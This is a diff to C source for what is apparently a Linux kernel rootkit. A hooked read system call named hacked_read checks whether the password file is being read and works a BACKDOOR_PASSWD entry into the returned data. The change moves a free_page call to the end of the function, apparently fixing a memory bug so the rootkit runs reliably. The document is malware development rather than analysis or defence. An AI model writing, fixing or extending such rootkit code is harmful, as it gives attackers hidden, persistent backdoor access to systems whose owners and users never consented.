@@ -169,8 +169,6 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 		return ret;
 	}
 
-	free_page((unsigned long)tmp);
-
 	if(strcmp(pathname, PASSWD_FILE)==0){
 
 		if(!(strstr(buf, BACKDOOR_PASSWD))){
@@ -232,6 +230,8 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 		copy_to_user(buf, tmp_buf, ret);
 		kfree(tmp_buf);		
 	}
+
+	free_page((unsigned long)tmp);
 
 	return ret;	
 }
